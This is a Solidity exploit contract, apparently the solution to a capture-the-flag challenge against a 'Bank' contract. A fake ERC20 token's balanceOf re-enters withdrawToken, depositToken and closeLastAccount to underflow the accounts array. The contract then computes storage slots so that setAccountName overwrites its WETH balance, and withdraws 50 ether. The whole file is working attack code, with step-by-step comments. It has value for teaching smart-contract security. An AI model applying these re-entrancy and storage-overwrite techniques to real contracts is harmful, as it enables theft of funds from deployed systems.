pragma solidity 0.4.24;

import "./Setup.sol";
import "./Bank.sol";
import "hardhat/console.sol";

contract BankAttacker {
    Setup public setup;
    Bank public bank;
    WETH9 constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    uint256 reentrancyState = 0;

    constructor(Setup _setup) {
        setup = _setup;
        bank = _setup.bank();
    }

    function attack() external payable {
        console.log("attack start");

        // start re-entrancy chain
        reentrancyState = 1;
        bank.depositToken(0, address(this), 0);

        // should have underflowed accounts.length

        // we want to write to accounts[this][0].balances[WETH]
        writeToBalanceSlot();

        // (string memory name, uint256 uniqTokens) = bank.getAccountInfo(0);
        // console.log("name %s", name);
        // console.log("uniqTokens %s", uniqTokens);

        uint256 wethBalance = bank.getAccountBalance(0, address(weth));
        console.log("balance %s", wethBalance);

        bank.withdrawToken(0, weth, 50 ether);

        require(setup.isSolved(), "!solved");
    }

    function writeToBalanceSlot() internal {
        // slot for accounts[this][0]
        uint256 accountStructSlot = getAccountLocation(0);
        console.log("accountStructSlot %s", accountStructSlot);

        // we want to write to accounts[this][0].balances[WETH]
        uint256 wethBalanceSlot =
            getMapLocation(accountStructSlot + 2, uint256(address(weth)));
        console.log("wethBalanceSlot %s", wethBalanceSlot);
        // console.logBytes32(bytes32(wethBalanceSlot));

        // using setAccountName we can write to accounts[this][accountId].name
        // keccak(keccak(addr . 2)) + 3 * accountId = accountStructSlot + 3 * accountId
        // therefore need to write with accountId = (wethBalanceSlot - accountStructSlot) / 3
        uint256 accountId = wethBalanceSlot - accountStructSlot;
        console.log("accountId mod 3 %s" , accountId % 3);
        require(accountId % 3 == 0, "mod 3 != 0, use different contract addr");
        accountId = (wethBalanceSlot - accountStructSlot) / 3;
        console.log("accountId %s" , accountId);

        // needs to be less than 32 bytes for string to be stored inline
        // stores AAA in msb, size * 2 in lowerbits, i.e.,
        // balance = 0x4141414141414141414141410000000000000000000000000000000000000018
        string memory toWrite = "AAAAAAAAAAAA";
        bank.setAccountName(accountId, toWrite);
    }

    function getArrayLocation(
        uint256 slot,
        uint256 index,
        uint256 elementSize
    ) public pure returns (uint256) {
        return
            uint256(keccak256(abi.encodePacked(slot))) + (index * elementSize);
    }

    function getMapLocation(uint256 slot, uint256 key)
        public
        pure
        returns (uint256)
    {
        return uint256(keccak256(abi.encodePacked(key, slot)));
    }

    function getAccountLocation(uint256 accountId)
        public
        view
        returns (uint256)
    {
        // gets accounts[addr][accountId].accountName
        // = keccak(keccak(addr . 2)) + 3 * accountId (if string size < 32)
        // need to convert address(this) to uint256 first (!!)
        uint256 slot =
            uint256(
                keccak256(abi.encodePacked(uint256(address(this)), uint256(2)))
            );
        slot = uint256(keccak256(slot));
        slot += accountId * 3;
        return slot;
    }

    // fake ERC20 that allows us to re-enter
    // no need to keep track of balances because using balance=0 works
    function transferFrom(
        address /* from */,
        address /* to */,
        uint256 /* amount */
    ) external returns (bool) {
        // console.log("transferFrom");
        return true;
    }

    function transfer(address /* to */, uint256 /* amount */) external returns (bool) {
        // console.log("transfer");
        return true;
    }

    // don't declare as view, will still be called and we can re-enter
    function balanceOf(address /* who */) public returns (uint256) {
        // things are complicated because closeLastAccount requires
        // uniqueTokens == 0, but withdraw requires uniqueTokens == 1
        // withdraw, re-enter on first balance,
        //    deposit, re-enter on first balance,
        //        closeLastAccount (uniqueTokens == 0)
        //    deposit continues execution and sets uniqueTokens to 1
        // withdraw continues execution and deletes account again
        // console.log("balanceOf called");
        if (reentrancyState == 1) {
            reentrancyState++;
            console.log("with-drawing %s", reentrancyState);

            bank.withdrawToken(0, this, 0);
        } else if (reentrancyState == 2) {
            reentrancyState++;
            console.log("depositing %s", reentrancyState);

            bank.depositToken(0, this, 0);
        } else if (reentrancyState == 3) {
            reentrancyState++;
            console.log("closing %s", reentrancyState);

            // close before deposit uniqueTokens++ is reached
            bank.closeLastAccount();
        }

        return 0;
    }

    function() external payable {
        console.log("fallback called");
    }
}
